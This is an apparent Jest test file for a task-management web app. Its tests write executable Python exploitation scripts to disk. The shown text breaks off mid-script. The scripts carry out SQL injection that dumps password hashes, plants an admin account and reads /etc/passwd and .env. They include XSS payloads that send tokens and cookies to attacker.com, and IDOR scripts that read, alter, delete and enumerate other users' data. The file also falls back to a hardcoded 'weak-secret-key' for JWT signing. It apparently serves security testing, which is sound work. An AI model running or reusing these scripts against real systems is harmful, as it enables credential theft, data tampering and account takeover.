import request from 'supertest';
import { app } from '../../src/server';
import { setupTestDatabase, testUsers } from '../setup';
import jwt from 'jsonwebtoken';
import * as fs from 'fs';
import * as path from 'path';

describe('Custom Exploitation Scripts', () => {
  let user1Token: string;
  let user2Token: string;
  let user1Id: number;
  let user2Id: number;
  let baseUrl: string;

  beforeAll(async () => {
    const users = await setupTestDatabase();
    user1Id = users.user1.id;
    user2Id = users.user2.id;

    user1Token = jwt.sign(
      { userId: user1Id, email: testUsers.user1.email },
      process.env.JWT_SECRET || 'weak-secret-key',
      { expiresIn: '1h' }
    );

    user2Token = jwt.sign(
      { userId: user2Id, email: testUsers.user2.email },
      process.env.JWT_SECRET || 'weak-secret-key',
      { expiresIn: '1h' }
    );

    baseUrl = process.env.TEST_BASE_URL || 'http://localhost:3000';
  });

  describe('SQL Injection Exploitation Scripts', () => {
    test('should create comprehensive SQL injection exploit', async () => {
      const sqlExploitScript = `#!/usr/bin/env python3

import requests
import json
import time
import sys
import base64
from urllib.parse import quote, unquote

class SQLInjectionExploit:
    def __init__(self, target_url, token):
        self.target_url = target_url
        self.token = token
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json',
            'User-Agent': 'SQLInjectionExploit/1.0'
        })
        self.vulnerable_endpoint = f"{target_url}/api/tasks/search"
        
    def test_injection_point(self):
        """Test if the endpoint is vulnerable to SQL injection"""
        test_payloads = ["'", "''", "\\"", "' OR '1'='1"]
        
        for payload in test_payloads:
            try:
                response = self.session.get(f"{self.vulnerable_endpoint}?query={quote(payload)}")
                
                if response.status_code == 500:
                    error_text = response.text.lower()
                    if any(keyword in error_text for keyword in ['syntax error', 'postgresql', 'relation does not exist']):
                        print(f"✓ SQL injection confirmed with payload: {payload}")
                        return True
                elif response.status_code == 200:
                    print(f"✓ Potential SQL injection with payload: {payload}")
                    
            except Exception as e:
                print(f"Error testing payload {payload}: {e}")
        
        return False
    
    def extract_database_info(self):
        """Extract database information using UNION injection"""
        print("\\n[+] Extracting database information...")
        
        # Get database version and basic info
        info_payload = "' UNION SELECT version(), current_database(), current_user(), inet_server_addr(), inet_server_port()::text, session_user--"
        
        try:
            response = self.session.get(f"{self.vulnerable_endpoint}?query={quote(info_payload)}")
            if response.status_code == 200:
                data = response.json()
                if data and len(data) > 0:
                    print(f"Database Version: {data[0].get('id', 'N/A')}")
                    print(f"Database Name: {data[0].get('title', 'N/A')}")
                    print(f"Current User: {data[0].get('description', 'N/A')}")
                    return True
        except Exception as e:
            print(f"Error extracting database info: {e}")
        
        return False
    
    def enumerate_tables(self):
        """Enumerate database tables"""
        print("\\n[+] Enumerating database tables...")
        
        tables_payload = "' UNION SELECT table_name, table_schema, table_type, '1', '2', '3' FROM information_schema.tables WHERE table_schema='public'--"
        
        try:
            response = self.session.get(f"{self.vulnerable_endpoint}?query={quote(tables_payload)}")
            if response.status_code == 200:
                data = response.json()
                tables = []
                for item in data:
                    if item.get('id') and item['id'] not in ['tasks', 'users', 'comments']:  # Skip normal results
                        tables.append(item['id'])
                
                if tables:
                    print(f"Found tables: {', '.join(tables)}")
                    return tables
        except Exception as e:
            print(f"Error enumerating tables: {e}")
        
        return []
    
    def enumerate_columns(self, table_name):
        """Enumerate columns for a specific table"""
        print(f"\\n[+] Enumerating columns for table: {table_name}")
        
        columns_payload = f"' UNION SELECT column_name, data_type, is_nullable, column_default, '5', '6' FROM information_schema.columns WHERE table_name='{table_name}'--"
        
        try:
            response = self.session.get(f"{self.vulnerable_endpoint}?query={quote(columns_payload)}")
            if response.status_code == 200:
                data = response.json()
                columns = []
                for item in data:
                    if item.get('id'):
                        columns.append({
                            'name': item['id'],
                            'type': item.get('title', 'unknown'),
                            'nullable': item.get('description', 'unknown')
                        })
                
                if columns:
                    print(f"Columns in {table_name}:")
                    for col in columns:
                        print(f"  - {col['name']} ({col['type']})")
                    return columns
        except Exception as e:
            print(f"Error enumerating columns: {e}")
        
        return []
    
    def extract_user_data(self):
        """Extract sensitive user data"""
        print("\\n[+] Extracting user credentials...")
        
        users_payload = "' UNION SELECT id::text, email, password_hash, first_name, last_name, created_at::text FROM users--"
        
        try:
            response = self.session.get(f"{self.vulnerable_endpoint}?query={quote(users_payload)}")
            if response.status_code == 200:
                data = response.json()
                users = []
                
                for item in data:
                    if '@' in str(item.get('title', '')):  # Email field indicates user data
                        user_data = {
                            'id': item.get('id'),
                            'email': item.get('title'),
                            'password_hash': item.get('description'),
                            'first_name': item.get('priority'),
                            'last_name': item.get('status')
                        }
                        users.append(user_data)
                
                if users:
                    print(f"Extracted {len(users)} user records:")
                    for user in users:
                        print(f"  - {user['email']} (ID: {user['id']})")
                        print(f"    Password Hash: {user['password_hash'][:20]}...")
                    
                    # Save to file
                    with open('./reports/extracted-users.json', 'w') as f:
                        json.dump(users, f, indent=2)
                    print("User data saved to: ./reports/extracted-users.json")
                    
                    return users
        except Exception as e:
            print(f"Error extracting user data: {e}")
        
        return []
    
    def extract_all_tasks(self):
        """Extract all tasks from all users"""
        print("\\n[+] Extracting all task data...")
        
        tasks_payload = "' UNION SELECT id::text, title, description, priority::text, status::text, user_id::text FROM tasks--"
        
        try:
            response = self.session.get(f"{self.vulnerable_endpoint}?query={quote(tasks_payload)}")
            if response.status_code == 200:
                data = response.json()
                tasks = []
                
                for item in data:
                    # Look for task data patterns
                    if item.get('priority') in ['LOW', 'MEDIUM', 'HIGH', 'URGENT']:
                        task_data = {
                            'id': item.get('id'),
                            'title': item.get('title'),
                            'description': item.get('description'),
                            'priority': item.get('priority'),
                            'status': item.get('status'),
                            'user_id': item.get('user_id')
                        }
                        tasks.append(task_data)
                
                if tasks:
                    print(f"Extracted {len(tasks)} task records:")
                    for task in tasks:
                        print(f"  - {task['title']} (User ID: {task['user_id']})")
                    
                    # Save to file
                    with open('./reports/extracted-tasks.json', 'w') as f:
                        json.dump(tasks, f, indent=2)
                    print("Task data saved to: ./reports/extracted-tasks.json")
                    
                    return tasks
        except Exception as e:
            print(f"Error extracting task data: {e}")
        
        return []
    
    def attempt_privilege_escalation(self):
        """Attempt to escalate privileges through SQL injection"""
        print("\\n[+] Attempting privilege escalation...")
        
        # Try to create admin user
        admin_payload = "'; INSERT INTO users (email, password_hash, first_name, last_name, email_verified) VALUES ('hacker@evil.com', '$2b$10$rGHQqHqKqHqKqHqKqHqKqO', 'Admin', 'Hacker', true); --"
        
        try:
            response = self.session.get(f"{self.vulnerable_endpoint}?query={quote(admin_payload)}")
            print(f"Admin creation attempt status: {response.status_code}")
            
            # Try to modify existing user to admin
            modify_payload = "'; UPDATE users SET first_name='Admin', last_name='Hacked' WHERE email='${testUsers.user2.email}'; --"
            
            response = self.session.get(f"{self.vulnerable_endpoint}?query={quote(modify_payload)}")
            print(f"User modification attempt status: {response.status_code}")
            
        except Exception as e:
            print(f"Error in privilege escalation: {e}")
    
    def attempt_file_access(self):
        """Attempt to access system files"""
        print("\\n[+] Attempting file system access...")
        
        # Try to read system files (PostgreSQL specific)
        file_payloads = [
            "' UNION SELECT pg_read_file('/etc/passwd'), '2', '3', '4', '5', '6'--",
            "' UNION SELECT pg_read_file('/etc/hosts'), '2', '3', '4', '5', '6'--",
            "' UNION SELECT pg_read_file('../.env'), '2', '3', '4', '5', '6'--"
        ]
        
        for payload in file_payloads:
            try:
                response = self.session.get(f"{self.vulnerable_endpoint}?query={quote(payload)}")
                if response.status_code == 200:
                    data = response.json()
                    if data and len(data) > 0:
                        file_content = data[0].get('id', '')
                        if file_content and len(file_content) > 10:
                            print(f"File access successful with payload: {payload[:50]}...")
                            print(f"Content preview: {file_content[:100]}...")
            except Exception as e:
                print(f"File access error: {e}")
    
    def run_full_exploit(self):
        """Run complete SQL injection exploitation"""
        print("="*60)
        print("SQL INJECTION EXPLOITATION FRAMEWORK")
        print("="*60)
        print(f"Target: {self.target_url}")
        print(f"Endpoint: {self.vulnerable_endpoint}")
        
        # Test injection point
        if not self.test_injection_point():
            print("[-] No SQL injection vulnerability detected")
            return False
        
        # Extract database information
        self.extract_database_info()
        
        # Enumerate database structure
        tables = self.enumerate_tables()
        for table in tables:
            self.enumerate_columns(table)
        
        # Extract sensitive data
        users = self.extract_user_data()
        tasks = self.extract_all_tasks()
        
        # Attempt privilege escalation
        self.attempt_privilege_escalation()
        
        # Attempt file access
        self.attempt_file_access()
        
        # Generate report
        report = {
            'target': self.target_url,
            'vulnerability': 'SQL Injection',
            'severity': 'CRITICAL',
            'cvss_score': 9.8,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'extracted_data': {
                'users': len(users) if users else 0,
                'tasks': len(tasks) if tasks else 0,
                'tables': len(tables) if tables else 0
            },
            'exploitation_successful': True,
            'recommendations': [
                'Use parameterized queries',
                'Implement input validation',
                'Apply principle of least privilege',
                'Enable query logging and monitoring'
            ]
        }
        
        with open('./reports/sql-injection-exploit-report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print("\\n" + "="*60)
        print("EXPLOITATION COMPLETED")
        print("="*60)
        print(f"Users extracted: {report['extracted_data']['users']}")
        print(f"Tasks extracted: {report['extracted_data']['tasks']}")
        print(f"Tables found: {report['extracted_data']['tables']}")
        print("Report saved to: ./reports/sql-injection-exploit-report.json")
        
        return True

if __name__ == '__main__':
    target_url = sys.argv[1] if len(sys.argv) > 1 else '${baseUrl}'
    token = sys.argv[2] if len(sys.argv) > 2 else '${user1Token}'
    
    exploit = SQLInjectionExploit(target_url, token)
    exploit.run_full_exploit()
`;

      const scriptPath = path.join(__dirname, '../scripts/sql-injection-exploit.py');
      fs.mkdirSync(path.dirname(scriptPath), { recursive: true });
      fs.writeFileSync(scriptPath, sqlExploitScript);
      fs.chmodSync(scriptPath, '755');

      expect(fs.existsSync(scriptPath)).toBe(true);
    });

    test('should create XSS exploitation script', async () => {
      const xssExploitScript = `#!/usr/bin/env python3

import requests
import json
import time
import sys
from urllib.parse import quote

class XSSExploit:
    def __init__(self, target_url, token):
        self.target_url = target_url
        self.token = token
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json',
            'User-Agent': 'XSSExploit/1.0'
        })
        
    def create_test_task(self):
        """Create a test task for XSS testing"""
        task_data = {
            'title': 'XSS Test Task',
            'description': 'Task created for XSS vulnerability testing',
            'priority': 'MEDIUM',
            'status': 'TODO'
        }
        
        try:
            response = self.session.post(f"{self.target_url}/api/tasks", json=task_data)
            if response.status_code == 201:
                task = response.json()
                print(f"✓ Test task created with ID: {task['id']}")
                return task['id']
        except Exception as e:
            print(f"Error creating test task: {e}")
        
        return None
    
    def test_stored_xss(self, task_id):
        """Test stored XSS in comment system"""
        print("\\n[+] Testing stored XSS vulnerabilities...")
        
        xss_payloads = [
            '<script>alert("Stored XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<iframe src="javascript:alert(\\'XSS\\')"></iframe>',
            '<body onload=alert("XSS")>',
            '<div onclick=alert("XSS")>Click me</div>',
            '<script>document.body.innerHTML="Hacked by XSS"</script>',
            '<script>fetch("/api/steal", {method:"POST", body:localStorage.token})</script>',
            '<script>new Image().src="http://attacker.com/steal?token=" + localStorage.getItem("token")</script>'
        ]
        
        successful_payloads = []
        
        for i, payload in enumerate(xss_payloads, 1):
            print(f"Testing payload {i}/{len(xss_payloads)}: {payload[:50]}...")
            
            comment_data = {'content': payload}
            
            try:
                # Create comment with XSS payload
                response = self.session.post(f"{self.target_url}/api/comments/task/{task_id}", json=comment_data)
                
                if response.status_code == 201:
                    comment = response.json()
                    
                    # Verify payload is stored without sanitization
                    if comment.get('content') == payload:
                        print(f"✓ Payload stored successfully: {payload[:30]}...")
                        successful_payloads.append({
                            'payload': payload,
                            'comment_id': comment.get('id'),
                            'stored': True
                        })
                    else:
                        print(f"✗ Payload was sanitized or modified")
                else:
                    print(f"✗ Failed to create comment: {response.status_code}")
                    
            except Exception as e:
                print(f"Error testing payload: {e}")
        
        return successful_payloads
    
    def test_reflected_xss(self):
        """Test reflected XSS in various endpoints"""
        print("\\n[+] Testing reflected XSS vulnerabilities...")
        
        reflected_payloads = [
            '<script>alert("Reflected XSS")</script>',
            '<img src=x onerror=alert("Reflected")>',
            '<svg onload=alert("Reflected")>',
            'javascript:alert("Reflected")',
            '<iframe src="javascript:alert(\\'Reflected\\')"></iframe>'
        ]
        
        test_endpoints = [
            f"{self.target_url}/api/tasks/search?query=",
            f"{self.target_url}/api/tasks/999999"  # Non-existent task for error reflection
        ]
        
        successful_reflections = []
        
        for endpoint in test_endpoints:
            print(f"Testing endpoint: {endpoint}")
            
            for payload in reflected_payloads:
                try:
                    if '?query=' in endpoint:
                        test_url = f"{endpoint}{quote(payload)}"
                        response = self.session.get(test_url)
                    else:
                        # Test in URL path
                        test_url = f"{endpoint}{quote(payload)}"
                        response = self.session.get(test_url)
                    
                    # Check if payload is reflected in response
                    if payload in response.text or quote(payload) in response.text:
                        print(f"✓ Reflected XSS found: {payload[:30]}...")
                        successful_reflections.append({
                            'endpoint': endpoint,
                            'payload': payload,
                            'reflected': True
                        })
                    
                except Exception as e:
                    print(f"Error testing reflected XSS: {e}")
        
        return successful_reflections
    
    def test_dom_xss(self, task_id):
        """Test DOM-based XSS vulnerabilities"""
        print("\\n[+] Testing DOM-based XSS vulnerabilities...")
        
        dom_payloads = [
            '<script>document.getElementById("app").innerHTML="DOM XSS"</script>',
            '<script>document.cookie="hacked=true"</script>',
            '<script>window.location="http://attacker.com/steal?data=" + document.cookie</script>',
            '<script>eval(atob("YWxlcnQoIkRPTSBYU1MiKQ=="))</script>',  # Base64 encoded alert
            '<script>setTimeout("alert(\\"DOM XSS\\")", 1000)</script>'
        ]
        
        successful_dom = []
        
        for payload in dom_payloads:
            comment_data = {'content': payload}
            
            try:
                response = self.session.post(f"{self.target_url}/api/comments/task/{task_id}", json=comment_data)
                
                if response.status_code == 201:
                    comment = response.json()
                    if comment.get('content') == payload:
                        successful_dom.append({
                            'payload': payload,
                            'comment_id': comment.get('id'),
                            'type': 'DOM XSS'
                        })
                        print(f"✓ DOM XSS payload stored: {payload[:30]}...")
                        
            except Exception as e:
                print(f"Error testing DOM XSS: {e}")
        
        return successful_dom
    
    def test_xss_filter_bypass(self, task_id):
        """Test XSS filter bypass techniques"""
        print("\\n[+] Testing XSS filter bypass techniques...")
        
        bypass_payloads = [
            '<ScRiPt>alert("Case bypass")</ScRiPt>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>eval("alert(\\"Eval bypass\\")")</script>',
            '<script src="data:text/javascript,alert(\\'Data URI\\')"></script>',
            '<svg><script>alert("SVG bypass")</script></svg>',
            '<math><mi//xlink:href="data:x,<script>alert(\\'Math bypass\\')</script>">',
            '<TABLE><TD BACKGROUND="javascript:alert(\\'Table bypass\\')">',
            '<DIV STYLE="background-image: url(javascript:alert(\\'CSS bypass\\'))">',
            '&lt;script&gt;alert("Entity bypass")&lt;/script&gt;',
            '&#60;script&#62;alert("Numeric bypass")&#60;/script&#62;',
            '%3Cscript%3Ealert("URL bypass")%3C/script%3E'
        ]
        
        successful_bypasses = []
        
        for payload in bypass_payloads:
            comment_data = {'content': payload}
            
            try:
                response = self.session.post(f"{self.target_url}/api/comments/task/{task_id}", json=comment_data)
                
                if response.status_code == 201:
                    comment = response.json()
                    if comment.get('content') == payload:
                        successful_bypasses.append({
                            'payload': payload,
                            'comment_id': comment.get('id'),
                            'type': 'Filter Bypass'
                        })
                        print(f"✓ Filter bypass successful: {payload[:30]}...")
                        
            except Exception as e:
                print(f"Error testing filter bypass: {e}")
        
        return successful_bypasses
    
    def generate_xss_poc(self, successful_payloads):
        """Generate XSS proof of concept"""
        print("\\n[+] Generating XSS proof of concept...")
        
        poc_html = f'''<!DOCTYPE html>
<html>
<head>
    <title>XSS Vulnerability Proof of Concept</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .payload {{ background: #f0f0f0; padding: 10px; margin: 10px 0; border-left: 3px solid #ff0000; }}
        .success {{ color: #008000; }}
        .warning {{ color: #ff8800; }}
    </style>
</head>
<body>
    <h1>XSS Vulnerability Report</h1>
    <p><strong>Target:</strong> {self.target_url}</p>
    <p><strong>Timestamp:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
    
    <h2>Successful XSS Payloads</h2>
'''
        
        for i, payload_info in enumerate(successful_payloads, 1):
            poc_html += f'''
    <div class="payload">
        <h3>Payload {i}: {payload_info.get('type', 'XSS')}</h3>
        <p><strong>Payload:</strong> <code>{payload_info['payload']}</code></p>
        <p><strong>Status:</strong> <span class="success">Successful</span></p>
        <p><strong>Comment ID:</strong> {payload_info.get('comment_id', 'N/A')}</p>
    </div>
'''
        
        poc_html += '''
    <h2>Impact</h2>
    <ul>
        <li>Session hijacking through cookie theft</li>
        <li>Credential harvesting via fake login forms</li>
        <li>Malware distribution</li>
        <li>Defacement of web application</li>
        <li>Phishing attacks</li>
    </ul>
    
    <h2>Recommendations</h2>
    <ul>
        <li>Implement proper input validation and output encoding</li>
        <li>Use Content Security Policy (CSP) headers</li>
        <li>Sanitize user input using libraries like DOMPurify</li>
        <li>Avoid using dangerouslySetInnerHTML in React</li>
        <li>Implement proper session management</li>
    </ul>
</body>
</html>
'''
        
        poc_path = './reports/xss-poc.html'
        with open(poc_path, 'w') as f:
            f.write(poc_html)
        
        print(f"XSS PoC saved to: {poc_path}")
        return poc_path
    
    def run_full_exploit(self):
        """Run complete XSS exploitation"""
        print("="*60)
        print("XSS EXPLOITATION FRAMEWORK")
        print("="*60)
        print(f"Target: {self.target_url}")
        
        # Create test task
        task_id = self.create_test_task()
        if not task_id:
            print("[-] Failed to create test task")
            return False
        
        all_successful_payloads = []
        
        # Test stored XSS
        stored_xss = self.test_stored_xss(task_id)
        all_successful_payloads.extend(stored_xss)
        
        # Test reflected XSS
        reflected_xss = self.test_reflected_xss()
        all_successful_payloads.extend(reflected_xss)
        
        # Test DOM XSS
        dom_xss = self.test_dom_xss(task_id)
        all_successful_payloads.extend(dom_xss)
        
        # Test filter bypasses
        bypass_xss = self.test_xss_filter_bypass(task_id)
        all_successful_payloads.extend(bypass_xss)
        
        # Generate PoC
        if all_successful_payloads:
            self.generate_xss_poc(all_successful_payloads)
        
        # Generate report
        report = {
            'target': self.target_url,
            'vulnerability': 'Cross-Site Scripting (XSS)',
            'severity': 'HIGH',
            'cvss_score': 6.1,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'successful_payloads': len(all_successful_payloads),
            'types_found': {
                'stored': len([p for p in all_successful_payloads if p.get('stored')]),
                'reflected': len([p for p in all_successful_payloads if p.get('reflected')]),
                'dom': len([p for p in all_successful_payloads if p.get('type') == 'DOM XSS']),
                'filter_bypass': len([p for p in all_successful_payloads if p.get('type') == 'Filter Bypass'])
            },
            'exploitation_successful': len(all_successful_payloads) > 0,
            'payloads': all_successful_payloads
        }
        
        with open('./reports/xss-exploit-report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print("\\n" + "="*60)
        print("XSS EXPLOITATION COMPLETED")
        print("="*60)
        print(f"Total successful payloads: {len(all_successful_payloads)}")
        print(f"Stored XSS: {report['types_found']['stored']}")
        print(f"Reflected XSS: {report['types_found']['reflected']}")
        print(f"DOM XSS: {report['types_found']['dom']}")
        print(f"Filter Bypasses: {report['types_found']['filter_bypass']}")
        print("Report saved to: ./reports/xss-exploit-report.json")
        
        return True

if __name__ == '__main__':
    target_url = sys.argv[1] if len(sys.argv) > 1 else '${baseUrl}'
    token = sys.argv[2] if len(sys.argv) > 2 else '${user1Token}'
    
    exploit = XSSExploit(target_url, token)
    exploit.run_full_exploit()
`;

      const xssScriptPath = path.join(__dirname, '../scripts/xss-exploit.py');
      fs.writeFileSync(xssScriptPath, xssExploitScript);
      fs.chmodSync(xssScriptPath, '755');

      expect(fs.existsSync(xssScriptPath)).toBe(true);
    });
  });

  describe('IDOR Exploitation Scripts', () => {
    test('should create IDOR exploitation script', async () => {
      const idorExploitScript = `#!/usr/bin/env python3

import requests
import json
import time
import sys
import threading
from concurrent.futures import ThreadPoolExecutor

class IDORExploit:
    def __init__(self, target_url, user1_token, user2_token):
        self.target_url = target_url
        self.user1_token = user1_token
        self.user2_token = user2_token
        
        # Create sessions for both users
        self.user1_session = requests.Session()
        self.user1_session.headers.update({
            'Authorization': f'Bearer {user1_token}',
            'Content-Type': 'application/json'
        })
        
        self.user2_session = requests.Session()
        self.user2_session.headers.update({
            'Authorization': f'Bearer {user2_token}',
            'Content-Type': 'application/json'
        })
        
    def create_test_data(self):
        """Create test data for both users"""
        print("[+] Creating test data for IDOR testing...")
        
        # Create tasks for user 1
        user1_tasks = []
        for i in range(3):
            task_data = {
                'title': f'User 1 Private Task {i+1}',
                'description': f'Confidential information for user 1 - task {i+1}',
                'priority': 'HIGH',
                'status': 'TODO'
            }
            
            try:
                response = self.user1_session.post(f"{self.target_url}/api/tasks", json=task_data)
                if response.status_code == 201:
                    task = response.json()
                    user1_tasks.append(task['id'])
                    print(f"✓ Created task {task['id']} for user 1")
            except Exception as e:
                print(f"Error creating user 1 task: {e}")
        
        # Create tasks for user 2
        user2_tasks = []
        for i in range(3):
            task_data = {
                'title': f'User 2 Secret Task {i+1}',
                'description': f'Sensitive data for user 2 - task {i+1}',
                'priority': 'URGENT',
                'status': 'IN_PROGRESS'
            }
            
            try:
                response = self.user2_session.post(f"{self.target_url}/api/tasks", json=task_data)
                if response.status_code == 201:
                    task = response.json()
                    user2_tasks.append(task['id'])
                    print(f"✓ Created task {task['id']} for user 2")
            except Exception as e:
                print(f"Error creating user 2 task: {e}")
        
        return user1_tasks, user2_tasks
    
    def test_task_idor(self, user1_tasks, user2_tasks):
        """Test IDOR vulnerabilities in task endpoints"""
        print("\\n[+] Testing IDOR vulnerabilities in task endpoints...")
        
        idor_results = {
            'read_access': [],
            'write_access': [],
            'delete_access': []
        }
        
        # Test read access - User 1 trying to access User 2's tasks
        print("Testing unauthorized read access...")
        for task_id in user2_tasks:
            try:
                response = self.user1_session.get(f"{self.target_url}/api/tasks/{task_id}")
                if response.status_code == 200:
                    task_data = response.json()
                    print(f"✓ IDOR: User 1 can read User 2's task {task_id}")
                    print(f"  Title: {task_data.get('title')}")
                    print(f"  Description: {task_data.get('description')}")
                    idor_results['read_access'].append({
                        'task_id': task_id,
                        'title': task_data.get('title'),
                        'description': task_data.get('description'),
                        'owner_id': task_data.get('userId')
                    })
                else:
                    print(f"✗ Access denied for task {task_id}")
            except Exception as e:
                print(f"Error testing read access for task {task_id}: {e}")
        
        # Test write access - User 1 trying to modify User 2's tasks
        print("\\nTesting unauthorized write access...")
        for task_id in user2_tasks:
            malicious_update = {
                'title': 'HACKED BY USER 1',
                'description': 'This task was modified by an unauthorized user via IDOR',
                'status': 'COMPLETED'
            }
            
            try:
                response = self.user1_session.put(f"{self.target_url}/api/tasks/{task_id}", json=malicious_update)
                if response.status_code == 200:
                    updated_task = response.json()
                    print(f"✓ IDOR: User 1 can modify User 2's task {task_id}")
                    print(f"  New title: {updated_task.get('title')}")
                    idor_results['write_access'].append({
                        'task_id': task_id,
                        'original_owner': updated_task.get('userId'),
                        'modification_successful': True
                    })
                else:
                    print(f"✗ Modification denied for task {task_id}")
            except Exception as e:
                print(f"Error testing write access for task {task_id}: {e}")
        
        # Test delete access - User 1 trying to delete User 2's tasks
        print("\\nTesting unauthorized delete access...")
        for task_id in user2_tasks[:1]:  # Only test one to avoid deleting all data
            try:
                response = self.user1_session.delete(f"{self.target_url}/api/tasks/{task_id}")
                if response.status_code == 200:
                    print(f"✓ IDOR: User 1 can delete User 2's task {task_id}")
                    idor_results['delete_access'].append({
                        'task_id': task_id,
                        'deletion_successful': True
                    })
                else:
                    print(f"✗ Deletion denied for task {task_id}")
            except Exception as e:
                print(f"Error testing delete access for task {task_id}: {e}")
        
        return idor_results
    
    def test_comment_idor(self, user1_tasks, user2_tasks):
        """Test IDOR vulnerabilities in comment system"""
        print("\\n[+] Testing IDOR vulnerabilities in comment system...")
        
        comment_idor = {
            'unauthorized_comments': [],
            'comment_access': []
        }
        
        # Create comments on User 2's tasks as User 1 (unauthorized)
        print("Testing unauthorized comment creation...")
        for task_id in user2_tasks:
            malicious_comment = {
                'content': 'This comment was added by an unauthorized user via IDOR vulnerability'
            }
            
            try:
                response = self.user1_session.post(f"{self.target_url}/api/comments/task/{task_id}", json=malicious_comment)
                if response.status_code == 201:
                    comment = response.json()
                    print(f"✓ IDOR: User 1 can comment on User 2's task {task_id}")
                    comment_idor['unauthorized_comments'].append({
                        'task_id': task_id,
                        'comment_id': comment.get('id'),
                        'content': comment.get('content')
                    })
                else:
                    print(f"✗ Comment creation denied for task {task_id}")
            except Exception as e:
                print(f"Error testing comment creation for task {task_id}: {e}")
        
        # Test accessing comments on User 2's tasks
        print("\\nTesting unauthorized comment access...")
        for task_id in user2_tasks:
            try:
                response = self.user1_session.get(f"{self.target_url}/api/comments/task/{task_id}")
                if response.status_code == 200:
                    comments = response.json()
                    print(f"✓ IDOR: User 1 can read comments on User 2's task {task_id}")
                    print(f"  Found {len(comments)} comments")
                    comment_idor['comment_access'].append({
                        'task_id': task_id,
                        'comments_count': len(comments),
                        'comments': comments
                    })
                else:
                    print(f"✗ Comment access denied for task {task_id}")
            except Exception as e:
                print(f"Error testing comment access for task {task_id}: {e}")
        
        return comment_idor
    
    def enumerate_all_resources(self):
        """Enumerate all accessible resources via ID enumeration"""
        print("\\n[+] Enumerating all resources via ID enumeration...")
        
        enumeration_results = {
            'accessible_tasks': [],
            'accessible_comments': []
        }
        
        # Enumerate tasks (ID 1-100)
        print("Enumerating tasks (ID 1-100)...")
        
        def check_task_access(task_id):
            try:
                response = self.user1_session.get(f"{self.target_url}/api/tasks/{task_id}")
                if response.status_code == 200:
                    task_data = response.json()
                    return {
                        'id': task_id,
                        'title': task_data.get('title'),
                        'owner_id': task_data.get('userId'),
                        'accessible': True
                    }
            except:
                pass
            return None
        
        # Use threading for faster enumeration
        with ThreadPoolExecutor(max_workers=10) as executor:
            task_futures = [executor.submit(check_task_access, i) for i in range(1, 101)]
            
            for future in task_futures:
                result = future.result()
                if result:
                    enumeration_results['accessible_tasks'].append(result)
                    print(f"✓ Accessible task {result['id']}: {result['title']} (Owner: {result['owner_id']})")
        
        # Enumerate comments (ID 1-50)
        print("\\nEnumerating comments (ID 1-50)...")
        
        def check_comment_access(comment_id):
            try:
                # Try to delete comment to test access
                response = self.user1_session.delete(f"{self.target_url}/api/comments/{comment_id}")
                if response.status_code == 200:
                    return {
                        'id': comment_id,
                        'accessible': True,
                        'deleted': True
                    }
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            comment_futures = [executor.submit(check_comment_access, i) for i in range(1, 51)]
            
            for future in comment_futures:
                result = future.result()
                if result:
                    enumeration_results['accessible_comments'].append(result)
                    print(f"✓ Accessible comment {result['id']} (deleted: {result['deleted']})")
        
        return enumeration_results
    
    def test_parameter_pollution(self, user2_tasks):
        """Test parameter pollution for access control bypass"""
        print("\\n[+] Testing parameter pollution for access control bypass...")
        
        pollution_results = []
        
        for task_id in user2_tasks:
            # Test various parameter pollution techniques
            pollution_urls = [
                f"{self.target_url}/api/tasks/{task_id}?userId={user1_token[:10]}&userId={user2_token[:10]}",
                f"{self.target_url}/api/tasks/{task_id}?user={user1_token[:10]}",
                f"{self.target_url}/api/tasks/{task_id}?owner=1&owner=2",
                f"{self.target_url}/api/tasks/{task_id}?id={task_id}&id=999"
            ]
            
            for url in pollution_urls:
                try:
                    response = self.user1_session.get(url)
                    if response.status_code == 200:
                        task_data = response.json()
                        print(f"✓ Parameter pollution successful: {url}")
                        pollution_results.append({
                            'url': url,
                            'task_id': task_id,
                            'successful': True,
                            'task_data': task_data
                        })
                except Exception as e:
                    print(f"Error testing parameter pollution: {e}")
        
        return pollution_results
    
    def run_full_exploit(self):
        """Run complete IDOR exploitation"""
        print("="*60)
        print("IDOR EXPLOITATION FRAMEWORK")
        print("="*60)
        print(f"Target: {self.target_url}")
        
        # Create test data
        user1_tasks, user2_tasks = self.create_test_data()
        
        if not user1_tasks or not user2_tasks:
            print("[-] Failed to create test data")
            return False
        
        # Test task IDOR
        task_idor = self.test_task_idor(user1_tasks, user2_tasks)
        
        # Test comment IDOR
        comment_idor = self.test_comment_idor(user1_tasks, user2_tasks)
        
        # Enumerate all resources
        enumeration = self.enumerate_all_resources()
        
        # Test parameter pollution
        pollution = self.test_parameter_pollution(user2_tasks)
        
        # Generate report
        report = {
            'target': self.target_url,
            'vulnerability': 'Insecure Direct Object References (IDOR)',
            'severity': 'HIGH',
            'cvss_score': 8.1,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'results': {
                'task_idor': {
                    'read_access_violations': len(task_idor['read_access']),
                    'write_access_violations': len(task_idor['write_access']),
                    'delete_access_violations': len(task_idor['delete_access'])
                },
                'comment_idor': {
                    'unauthorized_comments': len(comment_idor['unauthorized_comments']),
                    'unauthorized_access': len(comment_idor['comment_access'])
                },
                'enumeration': {
                    'accessible_tasks': len(enumeration['accessible_tasks']),
                    'accessible_comments': len(enumeration['accessible_comments'])
                },
                'parameter_pollution': len(pollution)
            },
            'exploitation_successful': True,
            'detailed_results': {
                'task_idor': task_idor,
                'comment_idor': comment_idor,
                'enumeration': enumeration,
                'parameter_pollution': pollution
            }
        }
        
        with open('./reports/idor-exploit-report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print("\\n" + "="*60)
        print("IDOR EXPLOITATION COMPLETED")
        print("="*60)
        print(f"Read access violations: {report['results']['task_idor']['read_access_violations']}")
        print(f"Write access violations: {report['results']['task_idor']['write_access_violations']}")
